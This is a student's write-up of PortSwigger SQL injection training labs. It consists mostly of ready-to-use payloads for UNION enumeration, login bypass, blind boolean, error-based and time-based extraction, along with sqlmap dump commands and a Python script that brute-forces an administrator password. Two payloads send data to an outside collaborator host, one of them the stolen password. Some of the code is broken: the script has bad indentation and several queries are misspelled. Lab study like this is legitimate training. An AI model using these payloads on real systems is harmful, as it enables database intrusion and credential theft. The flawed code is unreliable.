```toc
```


# SQL injection
---


```TXT
Main Points For SQL injection
	1. Discover If the SQL injection found or not.
	2. Dedicate the type for SQL injection.
	3. Dedicate the version for the SQL.
	4. Get the table name.
	5. Get the name of the Column_name.
	6. Get if 'administrator' user found or not.
	7. Dump the database.
```

----



# Image 1

![](assets/Pasted%20image%2020251019095747.png)

## 1. Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

 **Instructions:**
This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

**Solution:**

![](assets/Pasted%20image%2020251010031335.png)

![](assets/Pasted%20image%2020251010031426.png)

![](assets/Pasted%20image%2020251010031600.png)

---
---
## 2. Lab: SQL injection vulnerability allowing login bypass

 **Instructions:**
This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.

**Solution:**

![](assets/Pasted%20image%2020251010031944.png)

![](assets/Pasted%20image%2020251010032043.png)

![](assets/Pasted%20image%2020251010032021.png)

![](assets/Pasted%20image%2020251010032115.png)

![](assets/Pasted%20image%2020251010032139.png)

---
---
## 3. Lab: SQL injection attack, querying the database type and version on Oracle

 **Instructions:**
This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

**Solution:**

![](assets/Pasted%20image%2020251010032411.png)

![](assets/Pasted%20image%2020251010032440.png)

You can use `UNION` to get the data from database to use this you can make 
and with Oracle it has the table called dual, but you can not how many numbers of columns that use in this ? To know this you can test with the NULL to get this 
`'UNION SELECT NULL FROM dual-- -`  => and it does not work 

You can use the `UNION SELECT NULL,NULL FROM dual-- -`  => and it work.

It changed from `500 internal server` error to `404 not found` now I want to see the type of the null string or number `' UNION SELECT 'aa',NULL FROM dual-- -` it works.
Because it Oracle to get the version for the oracle database you can use `' UNION SELECT banner,NULL FROM v$version-- -` 
with this you can get the version for oracle database.


---
---
## 4. Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

 **Instructions:**
This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

 **Solution:**

`Pets' UNION SELECT NULL FROM information_schema.tables-- -`

`Pets' UNION SELECT NULL,NULL FROM information_schema.tables-- -`

`Pets' UNION SELECT 'abc',NULL FROM information_schema.tables-- -`

`Pets' UNION SELECT 123,NULL FROM information_schema.tables-- -`

`Pets' UNION SELECT @@version,NULL FROM information_schema.tables-- -`


---
---
## 5. Lab: SQL injection attack, listing the database contents on non-Oracle databases

 **Instructions:**
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

**Solution:**

`Corporate+gifts' UNION SELECT NULL FROM dual-- -`

`Corporate+gifts' UNION SELECT NULL FROM information_schema.tables-- -`

`Corporate+gifts' UNION SELECT NULL,NULL FROM information_schema.tables-- -`

`Corporate+gifts' UNION SELECT 'abc',NULL FROM information_schema.tables-- -`

`Corporate+gifts' UNION SELECT 'abc','def' FROM information_schema.tables-- -`

`Corporate+gifts' UNION SELECT 'abc',NULL FROM information_schema.tables-- -`

`Corporate+gifts' UNION SELECT table_name,NULL FROM information_schema.tables-- -`

`Corporate+gifts' UNION SELECT information_schema.columns,NULL FROM pg_user-- -`

`Corporate+gifts' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_owyiqh'-- -`

`Corporate+gifts' UNION SELECT username_pskmeg,password_kmalhv FROM users_owyiqh WHERE username_pskmeg='administrator'-- -`

---
---
## 6. Lab: SQL injection attack, listing the database contents on Oracle

 **Instructions:**
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

**Solution:**

To test it is vulnerable with SQL injection or not make the `'` if the response give you 500 internal server error you got the SQL injection.

You make the `' OR 1=1-- -`

First thing you want to search with this is the Type and Version of Database.
	`Gift' UNION SELECT NULL FROM dual-- -`
	
	`Gift' UNION SELECT NULL,NULL FROM dual-- -`
	
	`Gifts' UNION SELECT BANNER,NULL FROM v$version-- -`

Second Thing you want to get the name of database.

	`Gift' UNION SELECT table_name,NULL FROM all_tables-- -`

Third Thing you want to search about the names of columns for the table that content the users

	`Gift' UNION SELECT * FROM all_tab_columns WHERE table_name = 'USERS_GKUGOE'-- -`
	
	`Gift' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_GKUGOE'-- -`

Last Thing You got all users data.
	`Gift' UNION SELECT USERNAME_ELKYDN,PASSWORD_FPNEVM FROM USERS_GKUGOE-- -`
	
	`Gift' UNION SELECT USERNAME_ELKYDN,PASSWORD_FPNEVM FROM USERS_GKUGOE WHERE USERNAME_ELKYDN='administrator'-- -`

---
---






---

# Image 2


![](assets/Pasted%20image%2020251019100001.png)

---

## 7. Lab: SQL injection UNION attack, determining the number of columns returned by the query

**Instructions:**
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

**Solution:**

To test it is vulnerable with SQL injection or not make the `'` if the response give you 500 internal server error you got the SQL injection.

You make the `' OR 1=1-- -`

First thing you want to search with this is the Type and Version of Database.
To know the number of NULL you can do the :
		`Pets' UNION SELECT NULL FROM dual-- -`
		
		`Pets' UNION SELECT NULL,NULL FROM dual-- -`
		
		`Pets' UNION SELECT NULL,NULL,NULL FROM dual-- -`
		
		`Pets' UNION SELECT NULL,NULL,NULL,NULL FROM dual-- -`
		
		`Pets' UNION SELECT NULL,NULL,NULL,NULL,NULL FROM dual-- -`
		
		`Pets' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL FROM dual-- -`
		
		`Pets' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM dual-- -`
		
		`Pets' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM dual-- -``
Or you can use this method just increase the number.
		`Pets' UNION ORDER BY 2-- -`

Or you can use the Best way Use the SQLMap tool 
	1. First use the Burp suite to get the request that have the parameter that have the SQL injection and with right click **Save Item** to use it with SQL Map.
	2. command with SQL Map `python3 sqlmap.py -r fileyousave -p category`
1
	![](assets/Pasted%20image%2020251010023250.png)
	
	3.dump database `python3 sqlmap.py -r fileyousave -D public --tables!`
	
	![](assets/Pasted%20image%2020251010023648.png)
	
	![](assets/Pasted%20image%2020251010023710.png)

	4. get the tables name `python3 sqlmap.py -r fileyousave -D public `

![](assets/Pasted%20image%2020251010023612.png)

![](assets/Pasted%20image%2020251010023758.png)

Pets' UNION SELECT NULL,(CHR(113)||CHR(120)||CHR(112)||CHR(122)||CHR(113))||(CHR(114)||CHR(78)||CHR(116)||CHR(70)||CHR(105)||CHR(65)||CHR(71)||CHR(86)||CHR(81)||CHR(113)||CHR(101)||CHR(97)||CHR(78)||CHR(104)||CHR(86)||CHR(67)||CHR(87)||CHR(112)||CHR(105)||CHR(73)||CHR(103)||CHR(122)||CHR(102)||CHR(65)||CHR(105)||CHR(78)||CHR(86)||CHR(67)||CHR(85)||CHR(90)||CHR(104)||CHR(103)||CHR(82)||CHR(72)||CHR(105)||CHR(121)||CHR(117)||CHR(107)||CHR(118)||CHR(108))||(CHR(113)||CHR(120)||CHR(106)||CHR(107)||CHR(113)),NULL FROM information_schema.columns WHERE table_name = 'products'-- 0x11

---
---
## 8. Lab: SQL injection UNION attack, finding a column containing text

**Instructions:**
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a Previous Lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

**Solution:**

with SQL map 

![](assets/Pasted%20image%2020251010023250.png)

Gifts' UNION ALL SELECT NULL,(CHR(113)||CHR(113)||CHR(112)||CHR(112)||CHR(113))||(CHR(81)||CHR(110)||CHR(78)||CHR(107)||CHR(78)||CHR(66)||CHR(113)||CHR(105)||CHR(72)||CHR(98)||CHR(115)||CHR(77)||CHR(87)||CHR(122)||CHR(86)||CHR(84)||CHR(98)||CHR(107)||CHR(76)||CHR(87)||CHR(66)||CHR(87)||CHR(111)||CHR(111)||CHR(66)||CHR(71)||CHR(69)||CHR(83)||CHR(84)||CHR(71)||CHR(67)||CHR(83)||CHR(101)||CHR(76)||CHR(112)||CHR(90)||CHR(121)||CHR(110)||CHR(101)||CHR(87))||(CHR(113)||CHR(120)||CHR(98)||CHR(106)||CHR(113)),NULL-- 0x11

It give me this Payload I took it and replace this with 
	`Gifts' UNION ALL SELECT NULL,NULL,NULL-- 0x11
	
	`Gifts' UNION ALL SELECT NULL,'6yqrMC',NULL-- 0x11`


---
---
## 9. Lab: SQL injection UNION attack, retrieving data from other tables

**Instructions:**
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

**Solution:**

`python3 sqlmap.py -r ../../anwer/Desktop/Gifts -p category --dbs`

![](assets/Pasted%20image%2020251010074140.png)

`python3 sqlmap.py -r ../../anwer/Desktop/Gifts -p category -D public --tables`

![](assets/Pasted%20image%2020251010074234.png)

`python3 sqlmap.py -r ../../anwer/Desktop/Gifts -p category -D public -T users --columns`

![](assets/Pasted%20image%2020251010074311.png)

`python3 sqlmap.py -r ../../anwer/Desktop/Gifts -p category -D public -T users --columns --dump
`
![](assets/Pasted%20image%2020251010074354.png)

Gifts' UNION ALL  SELECT NULL, 'qbpzqylWuNgsypHjbhgwyfayKWXoklYtVNguBJkJULyWHqkxzq', NULL-- 0x11

SELECT * FROM information_schema.tables

Gifts' UNION SELECT table_name,(CHR(113)||CHR(98)||CHR(112)||CHR(122)||CHR(113))||(CHR(121)||CHR(108)||CHR(87)||CHR(117)||CHR(78)||CHR(103)||CHR(115)||CHR(121)||CHR(112)||CHR(72)||CHR(106)||CHR(98)||CHR(104)||CHR(103)||CHR(119)||CHR(121)||CHR(102)||CHR(97)||CHR(121)||CHR(75)||CHR(87)||CHR(88)||CHR(111)||CHR(107)||CHR(108)||CHR(89)||CHR(116)||CHR(86)||CHR(78)||CHR(103)||CHR(117)||CHR(66)||CHR(74)||CHR(107)||CHR(74)||CHR(85)||CHR(76)||CHR(121)||CHR(87)||CHR(72))||(CHR(113)||CHR(107)||CHR(120)||CHR(122)||CHR(113)) FROM information_schema.tables-- 0x11

---
---
## 10. Lab: SQL injection UNION attack, retrieving multiple values in a single column

**Instructions:**
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.


**Solution:**

Pets' UNION  SELECT username,(CHR(113)||CHR(106)||CHR(118)||CHR(107)||CHR(113))||(CHR(106)||CHR(116)||CHR(87)||CHR(68)||CHR(65)||CHR(71)||CHR(106)||CHR(122)||CHR(85)||CHR(111)||CHR(68)||CHR(86)||CHR(82)||CHR(73)||CHR(99)||CHR(77)||CHR(119)||CHR(121)||CHR(68)||CHR(90)||CHR(99)||CHR(73)||CHR(118)||CHR(68)||CHR(81)||CHR(88)||CHR(108)||CHR(110)||CHR(76)||CHR(115)||CHR(77)||CHR(65)||CHR(74)||CHR(106)||CHR(120)||CHR(79)||CHR(87)||CHR(108)||CHR(73)||CHR(112))||(CHR(113)||CHR(120)||CHR(98)||CHR(112)||CHR(113)) FROM users-- 0x11

---
---
## 11. Lab: Blind SQL injection with conditional responses

**Instructions:**
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `Welcome back` message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

**Solution:**

1. Check the parameter **TrackingId** has SQL injection vulnerability.
	- by putting the `'` after the real `TrackingId=Vfnb2EsFrcwE4KWg'`
	
	![](assets/Pasted%20image%2020251010222140.png)
	
2.  Check with operators OR/AND command to see the cases that welcome Message that appear
	- `TrackingId=Vfnb2EsFrcwE4KWg' OR '1'=1-- -`
	
	![](assets/Pasted%20image%2020251010204044.png)
	
	  ```
	  TrackingId=Vfnb2EsFrcwE4KWg' OR '1'=2 -- it will work 
	  TrackingId=Vfnb2EsFrcwE4KWg'AND '1'=1 -- it will work
	  TrackingId=Vfnb2EsFrcwE4KWg' AND '1'=2 -- it not work 
	  ```
	  
	- `TrackingId=Vfnb2EsFrcwE4KWg' OR '1'=2`
	
	- `TrackingId=Vfnb2EsFrcwE4KWg'AND '1'=1`
	
	- `TrackingId=Vfnb2EsFrcwE4KWg' AND '1'=2`

	![](assets/Pasted%20image%2020251010204336.png)
	
3. Check this database have the table called **users** 
	- `TrackingId=Vfnb2EsFrcwE4KWg' AND (SELECT 'a' FROM users LIMIT=1)='a`
	
	![](assets/Pasted%20image%2020251010205116.png)


4. Check that table users content the user called **administrator** 
	- `TrackingId=Vfnb2EsFrcwE4KWg' AND (SELECT 'a' FROM users WHRER username='administrator')='a`
	
	![](assets/Pasted%20image%2020251010205234.png)

5. Check the length of the password for the user **administrator** greater than 1
	- `TrackingId=Vfnb2EsFrcwE4KWg' AND (SELECT 'a' FROM users WHERE uaername='administrator' AND LENGTH(password)>1)='a`
	- you can increase the number of length for password to get the correct length for the password. OR you can go to **Intruder** and change the number automatic you can get the length of password will equal 20.
	
	![](assets/Pasted%20image%2020251010205405.png)
	![](assets/Pasted%20image%2020251010205507.png)
	
	- `TrackingId=Vfnb2EsFrcwE4KWg' AND (SELECT 'a' FROM users WHERE uaername='administrator' AND LENGTH(password)>20)='a`.
	
	
6.  Now we want to make the brute force for the password for the user called administrator.
	- Check the first character will equal 'a'  or not with making SUBSTRING(parameter,position,length).
	- `TrackingId=Vfnb2EsFrcwE4KWg' AND (SELECT substring(password,1,1) FROM users WHERE uaername='administrator')='a'--`
	
	- and this step you cannot do manually you can use Burp Suite with **Intruder** it will do this better
	
	![](assets/Pasted%20image%2020251012130001.png)

	![](assets/Pasted%20image%2020251012130048.png)
	
	with intruder you can add this to make the brute force for the password:
		`Cookie: TrackingId=KiZNMeTbfYG3ePxt' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a;`
		
	![](assets/Pasted%20image%2020251012124900.png)
	
	now you can collect the every number and what the character opposite to.
---
---
## 12. Lab: Blind SQL injection with conditional errors

**Instructions:**

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

**Solution:**
Steps to solve anything with SQL injection ask yourself some questions:
	1. Where is the input that make the SQL injection?
	2. Understand what this code make on the background and database?
	3. What is the Version of Database?
	4. What is  the Table_name of database?
	5. what is the Column_name of the table you found?
	6. if this table content an 'Administrator' account or not?


![](assets/Pasted%20image%2020251011025222.png)

![](assets/Pasted%20image%2020251011025303.png)

![](assets/Pasted%20image%2020251011025357.png)

![](assets/Pasted%20image%2020251011025426.png)


```python
#!/usr/bin/env python3

import requests
from string import ascii_lowercase, digits

def main():
	url = 'https://0a9900a203b9686d806ba88300db0081.web-security-academy.net/'
	trackingid = 'YOUR_TRACKINGID'
	chars = ascii_lowercase + digits
	position = 1
	password = ''
	try:
		while True:
			for character in chars:	
				payload = f"""{trackingid}'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{character}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"""
				
				cookie = {
				'session': 'YOUR_SESSIONID',
				'TrackingId': payload
				} 
				r = requests.get(url, cookies=cookie)
				if r.status_code == 200:
					continue
				else:
				position += 1
				password += ''.join(character)
				print(f'[+] Found password: {password}', end='\r')
				break
			if len(password) >= 20:
			print(f'[+] administrator password: {password}')	
			exit()
	except KeyboardInterrupt:
	print('\n[*] Bye!')
if __name__ == '__main__':

main()
```
---


----




---
# Image 3

![](assets/Pasted%20image%2020251019100056.png)

## 13. Lab: Visible error-based SQL injection

With the first request you can send it and the response will be 

![](assets/Pasted%20image%2020251014182124.png)

![](assets/Pasted%20image%2020251014203055.png)

![](assets/Pasted%20image%2020251014203141.png)

![](assets/Pasted%20image%2020251014203217.png)

![](assets/Pasted%20image%2020251014203246.png)

![](assets/Pasted%20image%2020251014203325.png)

![](assets/Pasted%20image%2020251014203358.png)

![](assets/Pasted%20image%2020251014203720.png)

![](assets/Pasted%20image%2020251014203754.png)

![](assets/Pasted%20image%2020251014203948.png)

![](assets/Pasted%20image%2020251014204111.png)

![](assets/Pasted%20image%2020251014204536.png)

![](assets/Pasted%20image%2020251014204623.png)

![](assets/Pasted%20image%2020251014204733.png)

kaao4uf47cl9e6t8n5fn

------


## 14. Lab: Blind SQL injection with time delays


![](assets/Pasted%20image%2020251015194322.png)

---

## 15. Blind SQL injection with time delays and information retrieval


1. Try `'` and Send this not get any error
2. add `' or '1'='1-- -` the response got 200 OK no show to me any error.
3. Now you can try with `SLEEP` But i do not know the Type or version for the database now i can try:  {All these not works }
	1. if it Oracle  `dbms_pipe.receive_message(('a'),10)`
	2. if it Microsoft `WAITFOR DELAY '0:0:10'`
	3. if it PostgreSQL `SELECT pg_sleep(10)`
	4. if it MySQL `SELECT SLEEP(10)`
	
4. Now you can try the conditional error for the every database: {And This work}
	1. Oracle :  `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`
	2. you can use `';BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--`
5. Now we want to know if this database content the table equal `users` or not:
	1. `';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE+pg_sleep(0) END FROM users--`
6. Now we want to know if the length of password bigger than 1
	1. `';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--`



![](assets/Pasted%20image%2020251016101507.png)

![](assets/Pasted%20image%2020251016101627.png)

![](assets/Pasted%20image%2020251016101935.png)

![](assets/Pasted%20image%2020251016102220.png)

![](assets/Pasted%20image%2020251016102319.png)

![](assets/Pasted%20image%2020251016102420.png)

![](assets/Pasted%20image%2020251016102506.png)

![](assets/Pasted%20image%2020251016102549.png)

![](assets/Pasted%20image%2020251016102749.png)

![](assets/Pasted%20image%2020251016110324.png)

![](assets/Pasted%20image%2020251016110457.png)

![](assets/Pasted%20image%2020251016110943.png)


---

## 16. Blind SQL Injection With Out-Of-Band Interaction

![](assets/Pasted%20image%2020251016112358.png)

First open the collaborator and take the domain to use it as a third party
![](assets/Pasted%20image%2020251016115415.png)

`'UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://wrrduhx89k31cjo4bta3xsq0drji7cv1.oastify.com/"> %remote;]>'),'/l') FROM dual --`


![](assets/Pasted%20image%2020251016115041.png)

![](assets/Pasted%20image%2020251016115457.png)



---

## 17. Blind SQL injection with out-of-band data exfiltration


' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--



---

## 18. SQL injection with filter bypass via XML encoding


![](assets/Pasted%20image%2020251016150328.png)

![](assets/Pasted%20image%2020251016150429.png)

![](assets/Pasted%20image%2020251016150606.png)

![](assets/Pasted%20image%2020251016151150.png)

![](assets/Pasted%20image%2020251016151233.png)

now you can try XML encoding

1 UNION

![](assets/Pasted%20image%2020251016151408.png)

1 UNION SELECT username FROM users

![](assets/Pasted%20image%2020251016151942.png)


![](assets/Pasted%20image%2020251016152049.png)






